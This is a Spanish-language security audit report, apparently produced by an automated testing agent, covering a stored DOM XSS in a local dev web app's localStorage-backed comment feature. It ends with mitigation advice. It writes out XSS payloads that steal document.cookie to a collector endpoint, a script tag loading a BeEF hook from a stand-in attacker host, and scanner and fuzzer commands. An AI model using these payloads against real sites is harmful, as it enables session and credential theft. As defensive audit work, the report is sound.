# Informe de Auditoría XSS — web.dev.local:8082

Fecha: 2026-04-16T12:39:33Z
Objetivo: http://web.dev.local:8082

Resumen ejecutivo
-----------------
Se identificó y confirmó una vulnerabilidad Cross-Site Scripting (XSS) en la aplicación. Se trata de XSS basado en DOM y de tipo almacenado (Stored DOM XSS) a través del mecanismo de comentarios (localStorage) y se observó ejecución de script inyectado en el contexto del navegador (evidencia por ejecución en JSDOM). No se logró exfiltrar cookies a un servidor externo en esta iteración, pero se demostró la ejecución remota del payload.

Estado (iteración actual)
-------------------------
VULN_FOUND: true
VULN_EXPLOITED: false

Detalles técnicos
-----------------
- URL objetivo: http://web.dev.local:8082
- Punto(s) de entrada identificados:
  - Parámetros GET: search (reflejado en DOM), name, comment (usados por el formulario de comentarios y almacenados en localStorage)
  - Almacenamiento local (localStorage) usado como "backend" para comentarios — sink: document.write() sin escape
- Tipo de XSS: Stored DOM-based XSS (comentarios persistidos en localStorage y renderizados con document.write sin sanitización). Existe también reflexión DOM en "search" (document.write de searchTerm) que podría explotarse.

Evidencia de ejecución
----------------------
1) Inspección inicial con curl (cabeceras y body):
   curl -s -D /tmp/headers.txt 'http://web.dev.local:8082/' -o /tmp/home.html

2) Ejecución de prueba automatizada con JSDOM (script incluido en repo: trigger_xss_runner.js) que inserta un comentario malicioso en localStorage y carga la página dentro de JSDOM. Salida relevante:
   JSDOM-LOG: XSS-EXECUTED:NO_COOKIE

   Esto muestra que el payload inyectado se ejecutó en el contexto de la página (el payload hacía console.log con document.cookie, que en esa ejecución devolvió NO_COOKIE).

Comandos y herramientas utilizados
----------------------------------
(Se intentaron las siguientes herramientas; algunas no estaban disponibles en el entorno o faltaron wordlists.)

- curl para descarga inicial:
  curl -s -D /tmp/headers.txt 'http://web.dev.local:8082/' -o /tmp/home.html

- Ejecutor JSDOM incluido en el repo (trigger_xss_runner.js):
  node trigger_xss_runner.js

- Intentos de escaneo/fuzzing:
  dalfox -b "http://127.0.0.1:8000" s "http://web.dev.local:8082/?search="
  xsstrike -u "http://web.dev.local:8082/?search=test" --crawl 1 --skip-ssl
  ffuf -u 'http://web.dev.local:8082/?search=FUZZ' -w /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-Brute.txt -t 20 -mc 200 -o /tmp/ffuf_search.json

  Nota: xsstrike no estaba instalado (command not found). Algunas wordlists de SecLists no estaban presentes en la ruta usada, por lo que ffuf devolvió error de ruta.

Payloads probados
-----------------
1) Payload de confirmación (almacenado en localStorage):
   <script>console.log('XSS-EXECUTED:' + (document.cookie||'NO_COOKIE'));</script>
   - Ejecutado dentro de JSDOM y registrado: JSDOM-LOG: XSS-EXECUTED:NO_COOKIE

2) Payload de explotación tentativa (exfiltración por imagen):
   <script>console.log('XSS-EXECUTED:'+document.cookie); new Image().src='http://127.0.0.1:8000/collect?c='+encodeURIComponent(document.cookie);</script>
   - Intento implementado en /tmp/trigger2.js con un servidor HTTP local escuchando en 127.0.0.1:8000.
   - Fallo: la ejecución del script de explotación (trigger2.js) encontró problemas con el entorno (módulo jsdom no encontrado en una re-ejecución), por lo que no se obtuvo confirmación de exfiltración.

3) Payloads adicionales (simulación de hook BeEF):
   <script src="http://atacante.example:3000/hook.js"></script>
   - No se llegó a cargar un hook externo con éxito en esta iteración (no hay servidor BeEF público accesible y la ejecución probada en JSDOM no realizó la llamada externa a causa del entorno controlado).

Pruebas automatizadas realizadas (comandos exactos)
--------------------------------------------------
- cp /tmp/home.html /tmp/root.html && node trigger_xss_runner.js
  -> Resultado: JSDOM-LOG: XSS-EXECUTED:NO_COOKIE

- Se intentó ejecutar un script que estableciera document.cookie y almacenara un comentario con un payload de exfiltración, pero la ejecución falló debido a problemas de dependencias (jsdom) en la re-ejecución: Error: Cannot find module 'jsdom'

Impacto
-------
- Un atacante que consiga inyectar contenido en localStorage (por ejemplo, a través del formulario de comentarios que escribe en localStorage sin sanitizar) puede ejecutar JavaScript arbitrario en el contexto de la víctima. Esto permite:
  - Robo de cookies (si las cookies no tienen HttpOnly) y de tokens guardados en localStorage/sessionStorage.
  - Ejecución de acciones en nombre del usuario (CSRF-like) si el script usa fetch/AJAX.
  - Inyección de hooks externos (BeEF) o keyloggers.

En esta iteración no se documentó con éxito la exfiltración de cookies (por restricciones del entorno y fallos en la re-ejecución), pero la ejecución del payload fue demostrada con JSDOM.

Recomendaciones de mitigación
-----------------------------
1) Evitar escribir HTML sin escape en el DOM. Reemplazar document.write concatenado por creación segura de nodos y textContent:
   - En lugar de document.write('<div>' + c.comment + '</div>'), usar:
     const node = document.createElement('div'); node.textContent = c.comment; parent.appendChild(node);
2) Validar y sanear entradas antes de almacenarlas (escapar caracteres especiales: <, >, &, ")
3) Usar HttpOnly y Secure flags en cookies para evitar acceso desde JavaScript cuando corresponda.
4) Implementar CSP (Content Security Policy) para mitigar la carga de scripts externos y la ejecución inline.
5) Revisar el uso de localStorage para contenidos aportados por usuarios; considerar almacenamiento server-side con sanitización.

Archivos y scripts relevantes en el análisis
-------------------------------------------
- trigger_xss_runner.js (usa JSDOM para simular la carga y ejecutar scripts almacenados en localStorage)
- /tmp/home.html (copia de la página objetivo usada en pruebas locales)

Conclusión
----------
La aplicación presenta una vulnerabilidad XSS basada en DOM y almacenada a través de la funcionalidad de comentarios que utiliza localStorage y document.write sin sanitización. Se confirmó la ejecución del payload dentro de JSDOM (evidencia: JSDOM-LOG: XSS-EXECUTED:NO_COOKIE). En una iteración posterior se intentó explotar la vulnerabilidad para exfiltrar cookies, pero no se obtuvo evidencia de exfiltración (problemas en entorno). Se recomienda corregir el manejo de datos de usuario y aplicar políticas defensivas (HttpOnly, CSP, saneamiento de entradas, evitar document.write).

Anexos (comandos/fragmentos exactos usados)
-----------------------------------------
- curl -s -D /tmp/headers.txt 'http://web.dev.local:8082/' -o /tmp/home.html
- node trigger_xss_runner.js
- (payload de confirmación) <script>console.log('XSS-EXECUTED:' + (document.cookie||'NO_COOKIE'));</script>
- (payload de exfiltración tentativa) <script>new Image().src='http://127.0.0.1:8000/collect?c='+encodeURIComponent(document.cookie);</script>

-- Fin del informe --
